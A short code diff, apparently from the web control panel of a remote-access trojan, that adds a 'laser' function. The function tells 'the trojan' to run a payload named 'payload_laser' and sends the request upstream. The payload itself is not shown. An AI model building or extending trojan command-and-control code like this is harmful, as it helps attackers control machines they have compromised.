@@ -63,4 +63,13 @@ wash.file = {
         // download the file
         window.location.href = url;
     },
+
+    laser: function(){
+        // assemble the command to send to the trojan
+        wash.command.action = 'payload_laser';
+        wash.command.args   = {} ;
+
+        // send the request upstream
+        wash.send_and_receive();
+    },
 }
